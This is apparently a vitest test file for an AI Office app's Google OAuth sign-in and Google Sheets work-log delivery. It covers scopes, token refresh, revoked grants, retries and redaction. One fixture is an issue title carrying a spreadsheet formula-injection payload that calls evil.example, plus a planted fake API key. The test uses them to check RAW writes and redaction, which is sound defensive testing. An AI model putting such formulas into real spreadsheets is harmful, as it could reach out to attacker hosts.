import {
  createEventBus,
  memoryEventStore,
  type EventBus,
  type OfficeEvent,
  type StoredEvent,
} from "@ai-office/events";
import {
  createRedactor,
  googleRedirectPath,
  googleSheetsCredentialsSchema,
  type NewNotice,
} from "@ai-office/shared";
import { encryptorFromKey } from "@ai-office/shared/crypto";
import { afterEach, describe, expect, it } from "vitest";

import {
  createCommunications,
  type Communications,
} from "../communications.ts";
import {
  createGoogleAuth,
  GoogleSignInError,
  type GoogleAuth,
} from "../google.ts";
import type { CompletedIssue } from "../publications.ts";
import { memoryCommunicationsStore } from "../store.ts";
import {
  serveFakeGoogle,
  serveFakeWebhook,
  type FakeGoogle,
} from "../testing.ts";
import { defaultTransports } from "./defaults.ts";
import { googleSheetsTransport, workLogHeader } from "./google-sheets.ts";

// Google sign-in's and the Google Sheets Connection's contract (PRD FR-91,
// FR-92, FR-94, FR-95), against a fake Google that answers as Google's
// OAuth endpoints and Sheets API do: signing in asks for the Google
// Connections' scopes and no more, with PKCE and for a refresh token; the
// access token is refreshed before it expires, and when Google refuses it;
// a revoked grant marks every Google Connection failing at once, and a new
// sign-in recovers them; each completed issue is one row in the work log,
// never two, even when an answer is lost and the delivery tried again;
// a row per Notice only with the Notices rule; rows at the Connection's
// detail level, redacted, and written RAW so nothing is read as a formula.

const start = new Date("2026-10-10T11:00:00.000Z");
const publicUrl = "https://office.example.com";
const clientId = "1234567890-abcdefghijklmnop.apps.googleusercontent.com";
const clientSecret = "GOCSPX-fakeClientSecret0123456789ab";
const spreadsheetId = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-abc";
const otherSpreadsheetId = "1ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210_-xyz";
const sheetsScope = "https://www.googleapis.com/auth/spreadsheets";
const anthropicKey = "sk-ant-api03-pastedintoanissue-Qw3Er4Ty5Ui6Op7As8Df9";
const pull = (number: number) =>
  `https://github.com/adrianeyre/web-shop/pull/${String(number)}`;
const minute = 60 * 1000;
const hour = 60 * minute;

const merged = (pullRequest: number, issue: number, floorId = "web-shop") =>
  ({
    type: "pull_request.merged",
    version: 1,
    floorId,
    issue,
    pullRequest,
    url: pull(pullRequest),
    sha: "b".repeat(40),
    by: "app",
  }) satisfies OfficeEvent;

const noticeRaised = (
  noticeId: string,
  kind: "action" | "info",
  title: string,
  floorId = "web-shop",
) =>
  ({
    type: "notice.raised",
    version: 1,
    noticeId,
    kind,
    title,
    floorId,
  }) satisfies OfficeEvent;

/** What AI Office recorded of each completed issue on web-shop. */
const completed: Record<number, CompletedIssue> = {
  5: {
    title: "Pay at checkout",
    agents: ["Ada", "Alan", "Grace"],
    reviewRounds: 2,
    tokens: 152_340,
    estimatedCostUsd: 1.23456,
  },
  6: {
    // A title is untrusted text: a planted key, and a formula.
    title: `=IMPORTXML("https://evil.example", "//a") ${anthropicKey}`,
    agents: ["Ada"],
    reviewRounds: 1,
    tokens: 40_000,
    estimatedCostUsd: 0.4,
  },
};

const servers: { close(): Promise<void> }[] = [];
afterEach(async () => {
  await Promise.all(servers.splice(0).map((server) => server.close()));
});

interface Setup {
  readonly google: FakeGoogle;
  readonly auth: GoogleAuth;
  readonly bus: EventBus;
  readonly agent: Communications;
  readonly store: ReturnType<typeof memoryCommunicationsStore>;
  readonly notices: NewNotice[];
  readonly advance: (ms: number) => void;
  /** Takes every event in, and sends what is due. */
  readonly run: () => Promise<void>;
  /** Plays the Owner through the consent screen, approving it (or `grant` only). */
  readonly signIn: (grant?: readonly string[]) => Promise<void>;
  readonly events: () => Promise<StoredEvent[]>;
}

async function setUp(
  options: { readonly accessTokenSeconds?: number } = {},
): Promise<Setup> {
  const clock = { time: start };
  const now = () => clock.time;
  const google = await serveFakeGoogle({
    clientId,
    clientSecret,
    redirectUri: `${publicUrl}${googleRedirectPath}`,
    spreadsheets: [
      { id: spreadsheetId, tabs: ["Sheet1"] },
      { id: otherSpreadsheetId, tabs: ["Sheet1"] },
    ],
    now,
    ...options,
  });
  servers.push(google);
  const bus = createEventBus({ store: memoryEventStore(), now });
  const store = memoryCommunicationsStore();
  const encryptor = encryptorFromKey(Buffer.alloc(32, 7));
  const redactor = createRedactor();
  const auth = createGoogleAuth({
    store,
    events: bus,
    encryptor,
    publicUrl,
    endpoints: google.endpoints,
    redactor,
    timeoutMs: 2000,
    now,
  });
  const notices: NewNotice[] = [];
  const agent = createCommunications({
    store,
    events: bus,
    encryptor,
    transports: {
      ...defaultTransports({ google: auth }),
      google_sheets: googleSheetsTransport({
        google: auth,
        apiUrl: google.sheetsUrl,
        timeoutMs: 2000,
      }),
    },
    publicUrl,
    floorName: (floorId) =>
      Promise.resolve(
        { "web-shop": "Web shop", blog: "Blog" }[floorId] ?? undefined,
      ),
    notice: () => Promise.resolve(undefined),
    raiseNotice: (notice) => {
      notices.push(notice);
      return Promise.resolve({ id: `notice-${String(notices.length)}` });
    },
    completedIssue: (floorId, issue) =>
      Promise.resolve(floorId === "web-shop" ? completed[issue] : undefined),
    google: auth,
    redactor,
    now,
    retry: { initialDelayMs: 1000 },
  });
  return {
    google,
    auth,
    bus,
    agent,
    store,
    notices,
    advance(ms) {
      clock.time = new Date(clock.time.getTime() + ms);
    },
    async run() {
      await agent.takeIn();
      await agent.deliverDue();
    },
    async signIn(grant) {
      const { url } = await auth.start();
      const back = google.consent(url, grant === undefined ? {} : { grant });
      if (back.code === undefined) {
        throw new Error("The consent screen gave no code.");
      }
      await auth.complete({ code: back.code, state: back.state });
    },
    events: () => bus.history({ limit: 1000 }),
  };
}

const sheetsRequest = (
  name: string,
  extra: Record<string, unknown> = {},
  credentials: Record<string, unknown> = {
    spreadsheetId: `https://docs.google.com/spreadsheets/d/${spreadsheetId}/edit#gid=0`,
    tab: "Work log",
  },
) =>
  ({
    type: "google_sheets",
    name,
    credentials,
    ...extra,
  }) as Parameters<Communications["add"]>[0];

/** Every row but the header, from `rows`. */
const dataRows = (rows: unknown[][] | undefined) => (rows ?? []).slice(1);

describe("Google sign-in", () => {
  it("asks for the Google Connections' scopes and no more, with PKCE and for a refresh token, and keeps the tokens sealed", async () => {
    const setup = await setUp();
    // Nothing to sign in with, then nothing to ask for.
    await expect(setup.auth.start()).rejects.toMatchObject({
      code: "google_not_configured",
    });
    expect((await setup.auth.info()).status).toBe("not_configured");
    await setup.auth.configure({ clientId, clientSecret });
    await expect(setup.auth.start()).rejects.toMatchObject({
      code: "google_no_services",
    });

    await setup.agent.add(sheetsRequest("Work log"));
    const before = await setup.auth.info();
    expect(before).toMatchObject({
      status: "signed_out",
      clientId,
      redirectUri: "https://office.example.com/admin/connections/google",
      services: ["sheets"],
      scopes: [sheetsScope],
    });
    await setup.signIn();

    // The consent screen asked for the spreadsheets scope only: no
    // identity, Drive or anything granted before.
    expect(setup.google.consents).toHaveLength(1);
    const [screen] = setup.google.consents;
    expect(screen?.scopes).toEqual([sheetsScope]);
    expect(screen?.params).toMatchObject({
      client_id: clientId,
      redirect_uri: "https://office.example.com/admin/connections/google",
      response_type: "code",
      access_type: "offline",
      prompt: "consent",
      code_challenge_method: "S256",
    });
    expect(screen?.params).not.toHaveProperty("include_granted_scopes");
    expect(setup.google.tokenRequests).toEqual([
      { grantType: "authorization_code" },
    ]);

    expect(await setup.auth.info()).toMatchObject({
      status: "signed_in",
      grantedScopes: [sheetsScope],
      missingServices: [],
      signedInAt: start,
    });
    // The refresh and access tokens and the client's secret are sealed:
    // none is in what is kept, or in any event.
    const record = await setup.store.googleSignIn();
    const kept = JSON.stringify(record);
    const said = JSON.stringify(await setup.events());
    expect(setup.google.issuedTokens).toHaveLength(2);
    for (const secret of [...setup.google.issuedTokens, clientSecret]) {
      expect(kept).not.toContain(secret);
      expect(said).not.toContain(secret);
    }
    expect(record?.refreshToken).toMatch(/^aio1:/);
    expect((await setup.events()).map(({ event }) => event)).toContainEqual({
      type: "google.signed_in",
      version: 1,
      scopes: [sheetsScope],
    });
    expect((await setup.events()).map(({ event }) => event)).toContainEqual({
      type: "config.changed",
      version: 1,
      scope: "google",
      keys: ["clientId", "clientSecret"],
    });
  });

  it("finishes each sign-in once; a declined consent, or one granting less, says so", async () => {
    const setup = await setUp();
    await setup.auth.configure({ clientId, clientSecret });
    await setup.agent.add(sheetsRequest("Work log"));

    const declined = await setup.auth.start();
    const no = setup.google.consent(declined.url, { decline: true });
    await expect(
      setup.auth.complete({ error: no.error ?? "", state: no.state }),
    ).rejects.toThrow("Google sign-in was cancelled: nothing was granted.");

    const { url } = await setup.auth.start();
    const back = setup.google.consent(url);
    await expect(
      setup.auth.complete({ code: back.code ?? "", state: "forged" }),
    ).rejects.toMatchObject({ code: "google_sign_in_not_found" });
    await setup.auth.complete({ code: back.code ?? "", state: back.state });
    // Its state is used up.
    await expect(
      setup.auth.complete({ code: back.code ?? "", state: back.state }),
    ).rejects.toBeInstanceOf(GoogleSignInError);

    // The Owner unticks Sheets on the consent screen: nothing is written,
    // and the Connection says why.
    await setup.signIn([]);
    expect(await setup.auth.info()).toMatchObject({
      status: "signed_in",
      grantedScopes: [],
      missingServices: ["sheets"],
    });
    const [connection] = await setup.agent.list();
    const test = await setup.agent.sendTest(connection?.id ?? "");
    expect(test.error).toBe(
      "The Google sign-in does not allow Google Sheets: sign in to Google again to allow it.",
    );
  });

  it("refreshes the access token a minute before it expires, and when Google refuses it early", async () => {
    const setup = await setUp();
    await setup.auth.configure({ clientId, clientSecret });
    const { id } = await setup.agent.add(sheetsRequest("Work log"));
    await setup.signIn();

    await setup.bus.publish(merged(15, 5));
    await setup.run();
    // The token from signing in serves.
    expect(
      setup.google.tokenRequests.map(({ grantType }) => grantType),
    ).toEqual(["authorization_code"]);

    // 59 minutes on, it expires within the minute: refreshed first.
    setup.advance(59 * minute + 1000);
    await setup.bus.publish(merged(16, 6));
    await setup.run();
    expect(
      setup.google.tokenRequests.map(({ grantType }) => grantType),
    ).toEqual(["authorization_code", "refresh_token"]);
    expect(dataRows(setup.google.rows(spreadsheetId, "Work log"))).toHaveLength(
      2,
    );

    // Google ends the access token early (as it can): the 401 refreshes
    // it once, and the row is written all the same.
    setup.google.expireAccessTokens();
    await setup.bus.publish(merged(17, 7));
    await setup.run();
    expect(
      setup.google.tokenRequests.map(({ grantType }) => grantType),
    ).toEqual(["authorization_code", "refresh_token", "refresh_token"]);
    expect((await setup.agent.deliveries(id))[0]).toMatchObject({
      status: "delivered",
      attempts: 1,
    });
    expect(dataRows(setup.google.rows(spreadsheetId, "Work log"))).toHaveLength(
      3,
    );
  });
});

describe("a revoked grant", () => {
  it("marks every Google Connection failing at once, with a Notice each; a new sign-in recovers them", async () => {
    const setup = await setUp();
    const webhook = await serveFakeWebhook();
    servers.push(webhook);
    await setup.auth.configure({ clientId, clientSecret });
    const log = await setup.agent.add(sheetsRequest("Work log"));
    const other = await setup.agent.add(
      sheetsRequest(
        "Blog log",
        {
          rules: {
            ...(await setup.agent.get(log.id)).rules,
            floorIds: ["blog"],
          },
        },
        { spreadsheetId: otherSpreadsheetId, tab: "Sheet1" },
      ),
    );
    const team = await setup.agent.add({
      type: "webhook",
      name: "Team chat",
      credentials: { url: webhook.url },
    });
    await setup.signIn();

    // The Owner removes AI Office's access in their Google account; an hour
    // on, the access token has expired and the refresh token is refused.
    setup.google.revokeGrant();
    setup.advance(hour);
    await setup.bus.publish(merged(15, 5));
    await setup.run();

    const [delivery] = await setup.agent.deliveries(log.id);
    expect(delivery).toMatchObject({ status: "pending", attempts: 1 });
    expect(delivery?.error).toBe(
      "Google refused AI Office's sign-in: the grant was revoked or has expired. Sign in to Google again on the Connections page.",
    );
    expect((await setup.auth.info()).status).toBe("revoked");
    // Both Google Connections are failing, the one with nothing to send too;
    // the webhook is not.
    expect(await setup.agent.get(log.id)).toMatchObject({ status: "failing" });
    expect(await setup.agent.get(other.id)).toMatchObject({
      status: "failing",
    });
    expect(await setup.agent.get(team.id)).toMatchObject({ status: "ok" });
    expect(setup.notices.map(({ title }) => title).sort()).toEqual([
      `Connection "Blog log" is failing: Google refused AI Office's sign-in. Sign in to Google again`,
      `Connection "Work log" is failing: Google refused AI Office's sign-in. Sign in to Google again`,
    ]);
    expect(
      setup.notices.find(({ title }) => title.includes('"Work log"'))?.links,
    ).toEqual([
      {
        label: "Open the Connection",
        url: `${publicUrl}/general-settings/connections?connection=${encodeURIComponent(log.id)}`,
      },
    ]);
    const events = (await setup.events()).map(({ event }) => event);
    const failing = events.filter(({ type }) => type === "connection.failing");
    expect(failing).toHaveLength(2);
    expect(failing).toContainEqual({
      type: "connection.failing",
      version: 1,
      connectionId: other.id,
      name: "Blog log",
      failures: 0,
      noticeId: expect.stringMatching(/^notice-/) as unknown,
      reason: "google_sign_in_revoked",
    });
    expect(events).toContainEqual({
      type: "google.grant_revoked",
      version: 1,
      connections: 2,
    });
    // Tried again while revoked, Google is not asked again, and no second
    // Notice is raised.
    setup.advance(5000);
    await setup.agent.deliverDue();
    expect(setup.notices).toHaveLength(2);
    expect(
      setup.google.tokenRequests.filter(
        ({ grantType }) => grantType === "refresh_token",
      ),
    ).toHaveLength(1);

    // Signed in again, what waited goes at once, and the Connection recovers.
    await setup.signIn();
    await setup.agent.deliverDue();
    expect((await setup.agent.deliveries(log.id))[0]).toMatchObject({
      status: "delivered",
      attempts: 3,
    });
    expect(await setup.agent.get(log.id)).toMatchObject({ status: "ok" });
    expect(dataRows(setup.google.rows(spreadsheetId, "Work log"))).toHaveLength(
      1,
    );
    expect((await setup.events()).map(({ event }) => event)).toContainEqual({
      type: "connection.recovered",
      version: 1,
      connectionId: log.id,
      name: "Work log",
    });
  });
});

describe("the work log", () => {
  it("one row per completed issue, never two: a lost answer is tried again without a second row", async () => {
    const setup = await setUp();
    await setup.auth.configure({ clientId, clientSecret });
    const { id } = await setup.agent.add(sheetsRequest("Work log"));
    await setup.signIn();

    // The tab is made, with a header row, and the first row's answer is
    // lost: the row is written but the delivery fails.
    setup.google.loseNextAnswer();
    await setup.bus.publish(merged(15, 5));
    await setup.run();
    expect(setup.google.tabs(spreadsheetId)).toEqual(["Sheet1", "Work log"]);
    expect((await setup.agent.deliveries(id))[0]).toMatchObject({
      status: "pending",
      attempts: 1,
      error: "Google Sheets answered 502: Bad gateway.",
    });
    expect(dataRows(setup.google.rows(spreadsheetId, "Work log"))).toHaveLength(
      1,
    );

    // Tried again, it finds its row by its id, and writes no other.
    setup.advance(5000);
    await setup.agent.deliverDue();
    // Taken in again, the event is not queued twice.
    await setup.run();
    const [delivery] = await setup.agent.deliveries(id);
    expect(delivery).toMatchObject({ status: "delivered", attempts: 2 });
    const rows = setup.google.rows(spreadsheetId, "Work log") ?? [];
    expect(rows).toEqual([
      [...workLogHeader],
      [
        "2026-10-10 11:00 UTC",
        "Issue completed",
        "Web shop",
        "https://github.com/adrianeyre/web-shop/issues/5",
        "Pay at checkout",
        "https://github.com/adrianeyre/web-shop/pull/15",
        "Ada, Alan, Grace",
        2,
        152_340,
        1.23,
        `${publicUrl}/activity?floorId=web-shop&issue=5`,
        delivery?.id,
      ],
    ]);
    // One append, the header and the row: the retry appended nothing. It
    // was RAW: nothing a title says is read as a formula.
    const appends = setup.google.sheetsRequests.filter(({ path }) =>
      path.endsWith(":append"),
    );
    expect(appends).toHaveLength(1);
    expect(
      appends.every(({ valueInputOption }) => valueInputOption === "RAW"),
    ).toBe(true);

    // A second completed issue is a second row; one on a Floor outside
    // its Floors, none.
    await setup.agent.update(id, {
      rules: {
        ...(await setup.agent.get(id)).rules,
        floorIds: ["web-shop"],
      },
    });
    await setup.bus.publish(merged(16, 6));
    await setup.bus.publish(merged(30, 3, "blog"));
    await setup.run();
    expect(dataRows(setup.google.rows(spreadsheetId, "Work log"))).toHaveLength(
      2,
    );
  });

  it("a row per Notice only with its Notices rule, and never about itself; Send test writes a test row", async () => {
    const setup = await setUp();
    await setup.auth.configure({ clientId, clientSecret });
    const quiet = await setup.agent.add(
      sheetsRequest(
        "Issues only",
        {},
        { spreadsheetId: otherSpreadsheetId, tab: "Sheet1" },
      ),
    );
    const { id, rules } = await setup.agent.add(sheetsRequest("Work log"));
    // A work log keeps only its Floors and Notices.
    expect(rules).toEqual({
      actionNotices: false,
      infoNotices: false,
      workComplete: false,
      floorIds: [],
      notices: false,
    });
    await setup.agent.update(id, { rules: { ...rules, notices: true } });
    await setup.signIn();

    await setup.bus.publish(
      noticeRaised("notice-9", "action", "PR #15 awaiting your approval"),
    );
    await setup.bus.publish(noticeRaised("notice-10", "info", "PR #15 merged"));
    await setup.run();
    expect(dataRows(setup.google.rows(otherSpreadsheetId, "Sheet1"))).toEqual(
      [],
    );
    const rows = dataRows(setup.google.rows(spreadsheetId, "Work log"));
    expect(rows.map((row) => row.slice(1, 5))).toEqual([
      ["Action Notice", "Web shop", "", "PR #15 awaiting your approval"],
      ["Info Notice", "Web shop", "", "PR #15 merged"],
    ]);
    expect(rows[0]?.[10]).toBe(`${publicUrl}/notices?notice=notice-9`);

    const test = await setup.agent.sendTest(quiet.id);
    expect(test).toMatchObject({ delivered: true, error: null });
    expect(
      dataRows(setup.google.rows(otherSpreadsheetId, "Sheet1")).map((row) =>
        row.slice(1, 5),
      ),
    ).toEqual([
      ["Test", "", "", "Test message from AI Office: this Connection works"],
    ]);
  });

  it('"links only": links and numbers, no Floor name, title or Agent; a credential in a title is redacted', async () => {
    const setup = await setUp();
    await setup.auth.configure({ clientId, clientSecret });
    const plain = await setup.agent.add(
      sheetsRequest(
        "Links",
        { detailLevel: "links_only" },
        {
          spreadsheetId: otherSpreadsheetId,
          tab: "Sheet1",
        },
      ),
    );
    await setup.agent.add(sheetsRequest("Titles"));
    await setup.signIn();
    await setup.bus.publish(merged(16, 6));
    await setup.run();

    const [linksOnly] = dataRows(
      setup.google.rows(otherSpreadsheetId, "Sheet1"),
    );
    const [delivery] = await setup.agent.deliveries(plain.id);
    expect(linksOnly).toEqual([
      "2026-10-10 11:00 UTC",
      "Issue completed",
      "",
      "https://github.com/adrianeyre/web-shop/issues/6",
      "",
      "https://github.com/adrianeyre/web-shop/pull/16",
      "",
      1,
      40_000,
      0.4,
      `${publicUrl}/activity?floorId=web-shop&issue=6`,
      delivery?.id,
    ]);
    const [titled] = dataRows(setup.google.rows(spreadsheetId, "Work log"));
    expect(titled?.[4]).toBe(
      '=IMPORTXML("https://evil.example", "//a") [REDACTED]',
    );
    const everything = JSON.stringify([
      setup.google.rows(otherSpreadsheetId, "Sheet1"),
      setup.google.rows(spreadsheetId, "Work log"),
    ]);
    expect(everything).not.toContain("sk-ant-");
  });

  it("a 429 is retried after its Retry-After; an unknown spreadsheet says so", async () => {
    const setup = await setUp();
    await setup.auth.configure({ clientId, clientSecret });
    const { id } = await setup.agent.add(sheetsRequest("Work log"));
    await setup.signIn();
    setup.google.rateLimit(1, 30);
    await setup.bus.publish(merged(15, 5));
    await setup.run();
    const [limited] = await setup.agent.deliveries(id);
    expect(limited?.error).toBe(
      "Google Sheets is rate-limiting this Connection (429).",
    );
    expect(limited?.nextAttemptAt).toEqual(new Date(start.getTime() + 30_000));
    setup.advance(30_000);
    await setup.agent.deliverDue();
    expect((await setup.agent.deliveries(id))[0]).toMatchObject({
      status: "delivered",
    });

    const missing = await setup.agent.add(
      sheetsRequest(
        "Missing",
        {},
        {
          spreadsheetId: "1MissingSpreadsheet000000000000000000000",
          tab: "Log",
        },
      ),
    );
    expect((await setup.agent.sendTest(missing.id)).error).toBe(
      "Google Sheets has no spreadsheet with that id (404).",
    );
  });
});

describe("a Google Sheets Connection's spreadsheet and tab", () => {
  it("takes the spreadsheet's address or its id, and a tab's name", () => {
    expect(
      googleSheetsCredentialsSchema.parse({
        spreadsheetId: `https://docs.google.com/spreadsheets/d/${spreadsheetId}/edit#gid=0`,
        tab: " Work log ",
      }),
    ).toEqual({ spreadsheetId, tab: "Work log" });
    expect(
      googleSheetsCredentialsSchema.parse({ spreadsheetId, tab: "Log" })
        .spreadsheetId,
    ).toBe(spreadsheetId);
    expect(
      googleSheetsCredentialsSchema.safeParse({
        spreadsheetId: "https://example.com/not-a-sheet",
        tab: "Log",
      }).success,
    ).toBe(false);
    expect(
      googleSheetsCredentialsSchema.safeParse({ spreadsheetId, tab: "a/b" })
        .success,
    ).toBe(false);
  });
});
